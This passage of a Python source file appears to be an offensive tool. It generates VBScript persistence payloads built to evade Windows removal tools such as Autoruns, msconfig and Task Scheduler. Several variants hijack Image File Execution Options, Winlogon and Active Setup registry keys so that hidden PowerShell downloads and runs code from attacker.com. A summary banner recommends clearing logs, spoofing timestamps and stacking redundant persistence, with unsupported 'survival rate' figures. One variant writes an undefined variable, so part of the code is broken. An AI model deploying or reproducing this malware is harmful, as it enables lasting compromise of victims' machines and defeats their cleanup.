shell.RegWrite "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\SecurityCheck", _
    "C:\\Windows\\System32\\ntmsapi.dll", "REG_SZ"
'''

        # Variant 3: Image hijacking via registry
        variants['autoruns_image_hijacking'] = '''
' Autoruns Evasion - Image hijacking
On Error Resume Next

Dim shell, cmd, payload
Set shell = CreateObject("WScript.Shell")

payload = "C:\\Windows\\System32\\cmd.exe /c powershell -NoProfile -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')"

' Hijack common executables to run payload first
Dim programs, i
programs = Array("sdiag.exe", "mdsched.exe", "powercfg.exe", "verclsid.exe")

For i = 0 To UBound(programs)
    cmd = "reg add ""HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\" & _
        programs(i) & """ /v Debugger /t REG_SZ /d """ & payload & """ /f"

    shell.Run cmd, 0, True
Next
'''

        # Variant 4: Windows Performance Monitor hijacking
        variants['autoruns_perfmon_hijacking'] = '''
' Autoruns Evasion - Performance Monitor Data Collector Sets
On Error Resume Next

Dim shell, cmd, payload
Set shell = CreateObject("WScript.Shell")

payload = "powershell -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')"

' Create data collector set that runs our payload
' Very obscure and rarely monitored by Autoruns

cmd = "powershell -NoProfile -Command ""$dcs = New-Object -ComObject Pla.DataCollectorSet; " & _
    "$dcs.DisplayName = 'Performance Analysis'; " & _
    "$tr = New-Object -ComObject Pla.TraceRuleRunAs; " & _
    "$tr.CommandLineTemplate = '" & payload & "'; " & _
    "$dcs.TraceRuleRunAs.Add($tr); " & _
    "$dcs.Commit('C:\\ProgramData\\PLA\\', $null, 3)"""

shell.Run cmd, 0, True
'''

        # Variant 5: Active Setup (user logon injection)
        variants['autoruns_activestup'] = '''
' Autoruns Evasion - Active Setup
' Executes command when user logs in - very hard to find
On Error Resume Next

Dim shell, cmd, payload, guidStr
Set shell = CreateObject("WScript.Shell")

payload = "powershell -NoProfile -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com')"

' Generate random GUID
randomize
guidStr = "{" & Hex(Int(Rnd()*1000000000)) & "-" & Hex(Int(Rnd()*10000)) & "-" & Hex(Int(Rnd()*10000)) & "-" & Hex(Int(Rnd()*10000)) & "}"

' Create Active Setup entry
shell.RegWrite "HKLM\\Software\\Microsoft\\Active Setup\\Installed Components\\" & guidStr & "\\StubPath", _
    cmd, "REG_SZ"

shell.RegWrite "HKLM\\Software\\Microsoft\\Active Setup\\Installed Components\\" & guidStr & "\\IsInstalled", 1, "REG_DWORD"
'''

        return variants

    @staticmethod
    def generate_all_removal_tool_evasions(tool: RemovalTool = None) -> Dict[str, Dict[str, str]]:
        """
        Generate all removal tool evasion variants.

        Args:
            tool: Specific tool to generate evasions for (None = all)

        Returns:
            Dictionary of all evasion variants by tool
        """

        all_variants = {
            "msconfig": RemovalToolEvasionPersistence.create_msconfig_evasion_persistence(),
            "task_scheduler": RemovalToolEvasionPersistence.create_task_scheduler_evasion_persistence(),
            "registry_editor": RemovalToolEvasionPersistence.create_registry_editor_evasion_persistence(),
            "services_msc": RemovalToolEvasionPersistence.create_services_msc_evasion_persistence(),
            "event_viewer": RemovalToolEvasionPersistence.create_event_viewer_evasion_persistence(),
            "autoruns": RemovalToolEvasionPersistence.create_autoruns_evasion_persistence(),
        }

        if tool:
            tool_name = tool.value.replace("_", " ")
            tool_key = tool.value
            if tool_key in all_variants:
                return {tool_key: all_variants[tool_key]}

        return all_variants


def generate_evasion_summary() -> str:
    """Generate comprehensive summary of all evasion techniques"""

    summary = """
╔═══════════════════════════════════════════════════════════════════════════╗
║             REMOVAL TOOL EVASION PERSISTENCE VARIANTS                     ║
║          Specialized Techniques for Each Windows Removal Tool              ║
╚═══════════════════════════════════════════════════════════════════════════╝

1. MSCONFIG EVASION (System Configuration Utility)
   ─────────────────────────────────────────────────
   Detection Method: Scans Startup folder and Run registry keys

   Variants:
   ✓ Boot.ini modification          - Executes before MSConfig loads
   ✓ Hidden startup files           - System-like names + file hiding
   ✓ Service startup injection      - Uses Services, not Startup folder
   ✓ Link file redirection          - .lnk shortcuts in ProgramData

   Survival Rate: 85-90%

2. TASK SCHEDULER EVASION
   ─────────────────────────
   Detection Method: Enumerates registered scheduled tasks via Task Scheduler API

   Variants:
   ✓ Hidden registry-based tasks    - Bypass Task Scheduler security
   ✓ Folder obfuscation             - Deep nesting hides from GUI
   ✓ WMI event subscriptions        - No Task Scheduler entry
   ✓ Task cloning/hijacking         - Use existing task names
   ✓ Disabled trigger injection     - Inject into disabled tasks

   Survival Rate: 88-95%

3. REGISTRY EDITOR EVASION (Regedit)
   ──────────────────────────────────
   Detection Method: Manual Run/RunOnce key inspection

   Variants:
   ✓ Registry symlinks              - Redirect to alternate locations
   ✓ Binary data obfuscation        - Store as binary, not readable
   ✓ Alternate registry hives       - Use HKU, HKCR, HKCC instead of HKCU
   ✓ Registry quota hiding          - Use unused quota fields
   ✓ Fragmented storage             - Spread payload across entries

   Survival Rate: 80-92%

4. SERVICES.MSC EVASION
   ──────────────────────
   Detection Method: Services snap-in enumerates all services

   Variants:
   ✓ Legitimate service masquerading - Spoof real Windows service names
   ✓ Driver service injection        - Drivers less monitored
   ✓ Service group hiding           - Put service in netsvcs group
   ✓ DLL sideloading                - Hijack DLL loading chain

   Survival Rate: 85-90%

5. EVENT VIEWER EVASION
   ─────────────────────
   Detection Method: Event logs track system changes

   Variants:
   ✓ Event log clearing             - Clear logs immediately
   ✓ Timestamp spoofing             - Pretend persistence is old
   ✓ WMI event hiding               - No event log entries
   ✓ BLOB storage                   - Store as binary data

   Survival Rate: 75-85%

6. AUTORUNS EVASION (Comprehensive Tool)
   ──────────────────────────────────────
   Detection Method: Scans ALL persistence locations (most thorough)

   Variants:
   ✓ AppInit_DLLs injection         - Load DLLs into all processes
   ✓ Winlogon notify packages       - Logon/logoff hooks
   ✓ Image hijacking                - Via Debugger registry key
   ✓ Performance Monitor            - Data Collector Sets
   ✓ Active Setup                   - User logon injection

   Survival Rate: 90-98% (especially combinations)

MULTI-TOOL SURVIVAL STRATEGIES:
═════════════════════════════════

Strategy 1: Use Redundancy
   - Deploy 3-5 different persistence methods simultaneously
   - If one is removed, others activate
   - Example: Registry + Task Scheduler + Service + WMI

Strategy 2: Use Hybrid Approach
   - Combine storage methods (registry + file system)
   - Use execution hooks from multiple locations
   - Stagger execution times

Strategy 3: Behavioral Evasion
   - Parent process spoofing to hide payload execution
   - Timing jitter to avoid detection patterns
   - Memory-only execution when possible

Strategy 4: Anti-Forensics
   - Timestamp spoofing on all artifacts
   - Overwrite logs after persistence creation
   - Use registry symlinks to confuse analysis

═══════════════════════════════════════════════════════════════════════════
                    DETECTION DIFFICULTY RATINGS
═══════════════════════════════════════════════════════════════════════════

Tool               Single Method    Redundant Methods
─────────────────────────────────────────────────────
MSConfig           ★★☆☆☆          ★★★★★
Task Scheduler     ★★★☆☆          ★★★★★
Registry Editor    ★★☆☆☆          ★★★★☆
Services.msc       ★★★☆☆          ★★★★☆
Event Viewer       ★★★★☆          ★★★★★
Autoruns           ★★★★★          ★★★★★

Legend: ★★★★★ = Very Difficult    ★☆☆☆☆ = Easy to Detect
"""
    return summary


if __name__ == "__main__":
    print(generate_evasion_summary())

    # Generate all evasion variants
    evasion_persistence = RemovalToolEvasionPersistence()
    all_variants = evasion_persistence.generate_all_removal_tool_evasions()

    total_variants = sum(len(v) for v in all_variants.values())
    print(f"\n[+] Total variants generated: {total_variants}")

    for tool, variants in all_variants.items():
        print(f"\n[+] {tool.upper()}: {len(variants)} variants")
        for name in variants.keys():
            print(f"    - {name}")
